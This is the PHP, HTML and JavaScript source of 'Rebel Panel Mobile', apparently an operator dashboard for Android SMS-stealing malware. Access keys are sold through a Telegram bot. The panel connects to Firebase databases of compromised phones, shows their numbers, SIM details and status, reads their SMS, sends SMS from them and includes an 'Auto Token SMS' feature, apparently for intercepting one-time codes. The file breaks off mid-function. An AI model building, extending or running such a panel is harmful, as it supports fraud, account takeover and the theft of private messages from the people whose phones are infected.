<?php
require_once __DIR__ . '/rebel_bot_lib.php';
$REBEL_HAS_APP_LIB = is_file(__DIR__ . '/rebel_app_lib.php');
if ($REBEL_HAS_APP_LIB) require_once __DIR__ . '/rebel_app_lib.php';

if (isset($_GET['rebel_app_api'])) {
  header('Content-Type: application/json; charset=UTF-8');
  header('Cache-Control: no-store');
  $cfg = $REBEL_HAS_APP_LIB ? rebel_app_update_load() : [
    'min_apk_version' => 1,
    'latest_apk_version' => 6,
    'apk_url' => '',
    'panel_url' => 'https://rebelbhaiya.alwaysdata.net/phone.php',
    'panel_version' => 8,
    'force_update' => false,
    'message' => 'Rebel Panel OK',
  ];
  echo json_encode([
    'ok' => true,
    'min_apk_version' => (int)($cfg['min_apk_version'] ?? 1),
    'latest_apk_version' => (int)($cfg['latest_apk_version'] ?? 6),
    'apk_url' => (string)($cfg['apk_url'] ?? ''),
    'panel_url' => (string)($cfg['panel_url'] ?? 'https://rebelbhaiya.alwaysdata.net/phone.php'),
    'panel_version' => (int)($cfg['panel_version'] ?? 8),
    'force_update' => !empty($cfg['force_update']),
    'message' => (string)($cfg['message'] ?? 'OK'),
    'server_time' => time(),
  ]);
  exit;
}

if (isset($_GET['rebel_auth']) || isset($_POST['rebel_auth'])) {
  if ($REBEL_HAS_APP_LIB && rebel_app_is_apk_request()) rebel_app_require_attest();
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $action = strtolower(trim((string)($body['action'] ?? $_REQUEST['action'] ?? 'login')));
  $data = rebel_keys_load();

  if ($action === 'check') {
    $token = trim((string)($body['token'] ?? ''));
    if ($token === '') rebel_json_out(['ok' => false, 'error' => 'No session'], 401);
    $valid = rebel_session_valid($data, $token);
    if (!$valid) {
      rebel_keys_save($data);
      rebel_json_out(['ok' => false, 'error' => 'Session revoked or expired'], 401);
    }
    rebel_keys_save($data);
    rebel_json_out(['ok' => true, 'expires' => (int)$valid['expires']]);
  }

  if ($action === 'logout') {
    $token = trim((string)($body['token'] ?? ''));
    if ($token !== '') {
      $hash = hash('sha256', $token);
      if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
      rebel_keys_save($data);
    }
    rebel_json_out(['ok' => true]);
  }

  $key = rebel_norm_key($body['key'] ?? $_REQUEST['key'] ?? '');
  if ($key === '') rebel_json_out(['ok' => false, 'error' => 'Access key required'], 400);
  $infer = rebel_key_infer_type($key);
  if ($infer === 'apk') {
    rebel_json_out(['ok' => false, 'error' => 'APK key — website needs /genkey on @Rebelpanelbot'], 403);
  }
  $row = $data['keys'][$key] ?? null;
  if ($row && !rebel_key_allowed_for_client($row, 'web')) {
    rebel_json_out(['ok' => false, 'error' => 'APK key only. Use /genkey for website'], 403);
  }
  $valid = rebel_key_login_allowed($data, $key);
  if (!$valid) {
    rebel_keys_save($data);
    $row = $data['keys'][$key] ?? null;
    if ($row && (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1)) {
      rebel_json_out(['ok' => false, 'error' => 'Key already used'], 403);
    }
    rebel_json_out(['ok' => false, 'error' => 'Invalid or expired key'], 403);
  }
  rebel_consume_key($data, $key);
  $remember = !empty($body['remember']);
  $session = rebel_create_session($data, $key, $remember);
  rebel_keys_save($data);
  rebel_json_out(['ok' => true, 'token' => $session['token'], 'expires' => $session['expires']]);
}

function rebel_avatar_url() {
  if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
  if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
  return 'https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg';
}
$REBEL_AVATAR_URL = rebel_avatar_url();

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
<meta name="theme-color" content="#050508"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
<title>Rebel Panel Mobile</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --bg:#050508;--surface:#0d0d14;--card:#14141f;--border:#2a2a3a;
  --accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;
  --success:#00ff9d;--error:#ff4466;--nav-h:64px;--hdr-h:56px;
  --safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow:hidden}
body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
.app{position:fixed;inset:0;display:flex;flex-direction:column;background:
  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.15),transparent),
  radial-gradient(ellipse 60% 40% at 100% 100%,rgba(255,149,0,0.08),transparent),
  var(--bg)}
.hidden{display:none!important}
.mono{font-family:'Space Mono',monospace}

/* LOGIN */
.login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t))}
.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5)}
.login-logo{display:flex;align-items:center;gap:12px;margin-bottom:24px}
.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px}
.login-logo h1{font-size:22px;font-weight:800}
.login-logo em{color:var(--accent);font-style:normal}
.login-sub{color:var(--muted);font-size:12px;margin:-16px 0 20px}
.key-input{width:100%;padding:16px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:14px;letter-spacing:1px;text-transform:uppercase;outline:none}
.key-input:focus{border-color:var(--accent)}
.login-err{color:var(--error);font-size:12px;margin:10px 0;display:none}
.btn-primary{width:100%;margin-top:16px;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent),#cc2020);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:15px;cursor:pointer}
.btn-primary:disabled{opacity:0.6}
.remember{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:12px;color:var(--muted)}
.remember input{width:18px;height:18px;accent-color:var(--accent)}

/* REBEL AVATAR — circle fixed, image animates (pure CSS, no JS needed) */
.avatar-stage{width:180px;height:215px;margin:0 auto 10px;position:relative}
.avatar-face-ring{width:132px;height:132px;margin:0 auto;border-radius:50%;overflow:hidden;border:2px solid var(--border);background:#0a0a10;box-shadow:0 8px 24px rgba(0,0,0,.45);position:relative;z-index:2}
.avatar-img-wrap{width:100%;height:100%;animation:rebelImgLook 9s ease-in-out infinite;-webkit-animation:rebelImgLook 9s ease-in-out infinite}
.avatar-face{width:145%;height:145%;max-width:none;object-fit:cover;object-position:50% 30%;display:block;margin:-22.5%}
.avatar-laptop{position:absolute;left:50%;bottom:0;width:120px;z-index:5;pointer-events:none;animation:rebelLaptop 9s ease-in-out infinite;-webkit-animation:rebelLaptop 9s ease-in-out infinite}
@keyframes rebelImgLook{
  0%,10%{transform:translate(0,0)}
  14%,26%{transform:translate(-26px,0)}
  30%,42%{transform:translate(26px,0)}
  46%,50%{transform:translate(0,0)}
  54%,76%{transform:translate(0,20px)}
  80%,100%{transform:translate(0,0)}
}
@-webkit-keyframes rebelImgLook{
  0%,10%{-webkit-transform:translate(0,0)}
  14%,26%{-webkit-transform:translate(-26px,0)}
  30%,42%{-webkit-transform:translate(26px,0)}
  46%,50%{-webkit-transform:translate(0,0)}
  54%,76%{-webkit-transform:translate(0,20px)}
  80%,100%{-webkit-transform:translate(0,0)}
}
@keyframes rebelLaptop{
  0%,50%{opacity:0;transform:translate3d(-50%,48px,0) scale(.45)}
  54%,58%{opacity:1;transform:translate3d(-50%,0,0) scale(1.08)}
  62%,76%{opacity:1;transform:translate3d(-50%,0,0) scale(1)}
  80%,100%{opacity:0;transform:translate3d(-50%,48px,0) scale(.45)}
}
@-webkit-keyframes rebelLaptop{
  0%,50%{opacity:0;-webkit-transform:translate3d(-50%,48px,0) scale(.45)}
  54%,58%{opacity:1;-webkit-transform:translate3d(-50%,0,0) scale(1.08)}
  62%,76%{opacity:1;-webkit-transform:translate3d(-50%,0,0) scale(1)}
  80%,100%{opacity:0;-webkit-transform:translate3d(-50%,48px,0) scale(.45)}
}
.laptop-lid{background:linear-gradient(180deg,#2a2a35,#1a1a22);border:2px solid #3a3a48;border-radius:6px 6px 2px 2px;padding:6px 7px 4px;transform-origin:bottom center}
.laptop-screen{background:#0a0f14;border-radius:3px;padding:6px 7px;min-height:42px;overflow:hidden;border:1px solid #1e3a2f}
.laptop-code{font-family:'Space Mono',monospace;font-size:7px;line-height:1.6;color:#00ff9d}
.laptop-code .dim{color:#4a6a5a}
.laptop-code .hi{color:#7b9cff}
.laptop-cursor{display:inline-block;width:4px;height:9px;background:#00ff9d;margin-left:1px;animation:blinkCursor .55s step-end infinite;vertical-align:middle}
.laptop-base{height:6px;background:linear-gradient(180deg,#3a3a48,#252530);border-radius:0 0 8px 8px;margin:0 5px;border:1px solid #4a4a58;border-top:none}
.laptop-line{display:block;opacity:0;transform:translateX(-6px)}
.laptop-line.l1{animation:rebelCode1 9s ease-in-out infinite}
.laptop-line.l2{animation:rebelCode2 9s ease-in-out infinite}
.laptop-line.l3{animation:rebelCode3 9s ease-in-out infinite}
@keyframes rebelCode1{0%,56%{opacity:0;transform:translateX(-6px)}60%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
@keyframes rebelCode2{0%,62%{opacity:0;transform:translateX(-6px)}66%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
@keyframes rebelCode3{0%,68%{opacity:0;transform:translateX(-6px)}72%,76%{opacity:1;transform:none}80%,100%{opacity:0}}
.laptop-glow{position:absolute;inset:auto -8px -6px -8px;height:20px;background:radial-gradient(ellipse,rgba(0,255,157,.18),transparent 70%);pointer-events:none;animation:rebelLaptopGlow 9s ease-in-out infinite}
@keyframes rebelLaptopGlow{0%,52%{opacity:0}56%,78%{opacity:1}82%,100%{opacity:0}}
.rebel-avatar-sm{width:40px;height:40px;flex-shrink:0}
.rebel-avatar-sm img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block;border:1px solid var(--border);background:#111}
.login-hero{text-align:center;margin-bottom:8px}
.login-hero h1{font-size:22px;font-weight:800;margin-top:4px}
.login-hero em{color:var(--accent);font-style:normal}
@keyframes blinkCursor{0%,100%{opacity:1}50%{opacity:0}}

/* HEADER */
.hdr{flex-shrink:0;height:calc(var(--hdr-h) + var(--safe-t));padding-top:var(--safe-t);padding-left:16px;padding-right:16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(12px);background:rgba(5,5,8,0.85);z-index:10}
.hdr-left{display:flex;align-items:center;gap:10px;min-width:0}
.hdr-title{font-size:15px;font-weight:800;white-space:nowrap}
.hdr-sub{font-size:9px;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:1px}
.hdr-actions{display:flex;gap:8px;flex-shrink:0}
.icon-btn{width:38px;height:38px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.fb-chip{max-width:110px;padding:8px 12px;border-radius:100px;border:1px solid rgba(255,149,0,0.3);background:rgba(255,149,0,0.1);color:var(--accent2);font-family:'Space Mono',monospace;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* SCREENS */
.screens{flex:1;overflow:hidden;position:relative}
.screen{position:absolute;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:12px 14px calc(var(--nav-h) + var(--safe-b) + 16px);opacity:0;pointer-events:none;transform:translateX(12px);transition:opacity .22s ease,transform .22s ease}
.screen.active{opacity:1;pointer-events:auto;transform:none}

/* STATS */
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.stat-card{padding:12px 10px;border-radius:14px;background:var(--card);border:1px solid var(--border);text-align:center}
.stat-val{font-size:20px;font-weight:800;font-family:'Space Mono',monospace}
.stat-val.on{color:var(--success)}.stat-val.off{color:var(--error)}
.stat-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-top:2px}

.search-wrap{margin-bottom:12px}
.search{width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:14px;outline:none}
.search:focus{border-color:var(--accent)}

/* DEVICE CARDS */
.dev-card{display:flex;gap:12px;padding:14px;margin-bottom:10px;border-radius:16px;background:var(--card);border:1px solid var(--border);cursor:pointer;transition:transform .15s ease,border-color .15s}
.dev-card:active{transform:scale(0.98)}
.dev-card.active{border-color:rgba(255,60,60,0.5);box-shadow:0 0 20px rgba(255,60,60,0.12)}
.dev-bar{width:4px;border-radius:4px;background:var(--muted);flex-shrink:0}
.dev-card.online .dev-bar{background:var(--success);box-shadow:0 0 8px var(--success)}
.dev-body{flex:1;min-width:0}
.dev-phone{font-size:15px;font-weight:800;margin-bottom:2px}
.dev-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.dev-chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
.chip{font-size:8px;padding:3px 8px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace}
.chip.bat{color:var(--success);border-color:rgba(0,255,157,0.25)}
.empty-state{text-align:center;padding:48px 20px;color:var(--muted)}
.empty-state .ico{font-size:40px;margin-bottom:12px;opacity:0.5}

/* DEVICE HERO */
.hero-card{padding:18px;border-radius:20px;background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,30,0.95));border:1px solid rgba(255,60,60,0.2);margin-bottom:14px}
.hero-phone{font-size:22px;font-weight:800;margin-bottom:4px}
.hero-model{font-size:12px;color:var(--muted);margin-bottom:12px}
.hero-badge{display:inline-block;padding:5px 12px;border-radius:100px;font-size:10px;font-weight:800;font-family:'Space Mono',monospace;margin-bottom:14px}
.hero-badge.online{background:rgba(0,255,157,0.15);color:var(--success)}
.hero-badge.offline{background:rgba(107,107,136,0.15);color:var(--muted)}
.hero-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.hero-cell{padding:10px;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05)}
.hero-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-bottom:4px}
.hero-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}

/* SMS CHAT */
.sms-list{display:flex;flex-direction:column;gap:10px}
.sms-bubble{max-width:92%;padding:12px 14px;border-radius:16px;font-size:13px;line-height:1.45}
.sms-bubble.in{align-self:flex-start;background:var(--card);border:1px solid var(--border);border-bottom-left-radius:4px}
.sms-bubble.out{align-self:flex-end;background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.25);border-bottom-right-radius:4px}
.sms-from{font-size:10px;font-weight:800;margin-bottom:4px;color:var(--accent2)}
.sms-time{font-size:9px;color:var(--muted);margin-top:6px;font-family:'Space Mono',monospace}
.sms-badge{display:inline-block;font-size:7px;padding:2px 6px;border-radius:6px;background:rgba(255,60,60,0.2);color:var(--accent);margin-left:6px}

/* SEND FORM */
.form-card{padding:16px;border-radius:18px;background:var(--card);border:1px solid var(--border)}
.form-label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
.form-input,.form-textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:15px;outline:none;margin-bottom:14px}
.form-textarea{min-height:120px;resize:none;font-family:inherit}
.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--success),#00cc7a);color:#050508;font-weight:800;font-size:15px;cursor:pointer}
.send-status{margin-top:10px;font-size:11px;font-family:'Space Mono',monospace;text-align:center}

/* MORE */
.menu-list{display:flex;flex-direction:column;gap:8px}
.menu-item{display:flex;align-items:center;justify-content:space-between;padding:16px;border-radius:14px;background:var(--card);border:1px solid var(--border);cursor:pointer;font-size:14px;font-weight:600}
.menu-item span{color:var(--muted);font-size:12px;font-weight:400}
.menu-item.danger{border-color:rgba(255,68,102,0.3);color:var(--error)}
.toggle{width:44px;height:26px;border-radius:100px;background:var(--border);position:relative;transition:background .2s}
.toggle.on{background:var(--success)}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:transform .2s}
.toggle.on::after{transform:translateX(18px)}
.proto-tag{display:inline-block;padding:4px 10px;border-radius:8px;background:rgba(123,47,255,0.15);color:#b388ff;font-size:9px;font-family:'Space Mono',monospace;margin-bottom:14px}

/* BOTTOM NAV */
.bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(8,8,12,0.95);border-top:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(16px)}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px}
.nav-item .ico{font-size:20px;line-height:1}
.nav-item.active{color:var(--accent)}
.nav-item.active .ico{filter:drop-shadow(0 0 6px var(--accent))}

/* SHEET */
.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:50;opacity:0;pointer-events:none;transition:opacity .25s}
.sheet-bg.open{opacity:1;pointer-events:auto}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--surface);border-radius:20px 20px 0 0;padding:12px 16px calc(20px + var(--safe-b));max-height:70vh;overflow-y:auto;transform:translateY(100%);transition:transform .28s cubic-bezier(.32,.72,0,1)}
.sheet.open{transform:translateY(0)}
.sheet-handle{width:36px;height:4px;border-radius:4px;background:var(--border);margin:0 auto 16px}
.sheet-title{font-size:13px;font-weight:800;margin-bottom:12px}
.fb-option{display:flex;align-items:center;justify-content:space-between;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer}
.fb-option.active{border-color:var(--accent);background:rgba(255,60,60,0.08)}
.fb-option .cnt{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}

.toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
.toast{padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--border);font-size:12px;margin-bottom:8px;animation:toastIn .3s ease}
.toast.ok{border-color:rgba(0,255,157,0.3)}.toast.err{border-color:rgba(255,68,102,0.3)}
@keyframes toastIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<!-- LOGIN -->
<div class="login-screen" id="loginScreen">
  <div class="login-card">
    <div class="login-hero">
      <div class="avatar-stage" id="rebelAvatarStage" data-avatar-ver="7">
        <div class="avatar-face-ring">
          <div class="avatar-img-wrap">
            <img class="avatar-face" id="avatarFaceImg" src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
          </div>
        </div>
        <div class="avatar-laptop">
          <div class="laptop-glow"></div>
          <div class="laptop-lid">
            <div class="laptop-screen">
              <div class="laptop-code" id="laptopCode">
                <span class="laptop-line l1"><span class="dim">$</span> firebase.init()</span>
                <span class="laptop-line l2"><span class="hi">send</span>Sms(<span class="dim">to</span>, msg)</span>
                <span class="laptop-line l3"><span class="dim">$</span> rebel.unlock()<span class="laptop-cursor"></span></span>
              </div>
            </div>
          </div>
          <div class="laptop-base"></div>
        </div>
      </div>
      <h1><em>Rebel</em> Mobile</h1>
    </div>
    <p class="login-sub">🌐 Website key — @Rebelpanelbot → <b>/genkey</b></p>
    <div class="login-err" id="loginErr"></div>
    <input class="key-input" id="loginKey" placeholder="RBW-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
    <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
    <button class="btn-primary" id="loginBtn" onclick="doLogin()">Unlock Panel</button>
  </div>
</div>

<!-- APP -->
<div class="app hidden" id="appShell">
  <header class="hdr">
    <div class="hdr-left">
      <div class="rebel-avatar-sm">
        <img src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
      </div>
      <div>
        <div class="hdr-title">Rebel Mobile</div>
        <div class="hdr-sub" id="hdrSub">Connecting...</div>
      </div>
    </div>
    <div class="hdr-actions">
      <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
      <button class="icon-btn" onclick="refreshData()" title="Refresh">↻</button>
    </div>
  </header>

  <div class="screens">
    <section class="screen active" id="screen-home">
      <div class="stats-row">
        <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
        <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
        <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
      </div>
      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
      <div id="devList"></div>
    </section>

    <section class="screen" id="screen-device">
      <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
      <div id="deviceHero" class="hidden"></div>
    </section>

    <section class="screen" id="screen-sms">
      <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
      <div class="sms-list" id="smsList"></div>
    </section>

    <section class="screen" id="screen-send">
      <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
      <div class="form-card hidden" id="sendForm">
        <label class="form-label">To Number</label>
        <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
        <label class="form-label">Message</label>
        <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
        <button class="btn-send" onclick="sendSms()">Send SMS</button>
        <div class="send-status" id="sendStatus"></div>
      </div>
    </section>

    <section class="screen" id="screen-more">
      <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
      <div class="menu-list">
        <div class="menu-item" onclick="openFbSheet()">Firebase Project <span id="moreFbName">—</span></div>
        <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
        <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
        <a class="menu-item" href="sex.php" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
        <div class="menu-item danger" onclick="doLogout()">Logout</div>
      </div>
    </section>
  </div>

  <nav class="bottom-nav">
    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
    <button class="nav-item" data-tab="more" onclick="switchTab('more',this)"><span class="ico">⚙️</span>More</button>
  </nav>
</div>

<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
<div class="sheet" id="fbSheet">
  <div class="sheet-handle"></div>
  <div class="sheet-title">Switch Firebase</div>
  <div id="fbSheetList"></div>
</div>
<div class="toast-wrap" id="toasts"></div>

<script src="firebase_defaults.js"></script>
<script>
var AUTH_URL='phone.php?rebel_auth=1';
var SMS_TOKEN_URL='sex.php?sms_token_api=1';
var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[];
var ACTIVE_FB_KEY='rbl_active_fb_m';
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  try{
    var s=localStorage.getItem('rbl_firebase_list');
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      return p;
    }}
  }catch(e){}
  return DEFAULT_FIREBASES.slice();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
  updateFbUi();
}
initFirebase();

function updateFbUi(){
  var inst=getFbInstance(activeFbId);
  var name=inst?inst.name:'—';
  document.getElementById('fbChip').textContent=name;
  document.getElementById('moreFbName').textContent=name;
  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html;
}
function switchFirebase(id){
  if(!getFbInstance(id))return;
  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(s.mobNo)return String(s.mobNo).trim();
  if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
  return String(s.phone_number||s.phone||s.mobile||'').trim();
}
function resolveOnlineStatus(s,fbId){
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel')return s.status===true||s.online===true;
  if(s.online_status===true)return true;if(s.online_status===false)return false;
  return s.online===true||s.status==='online'||s.status===true;
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
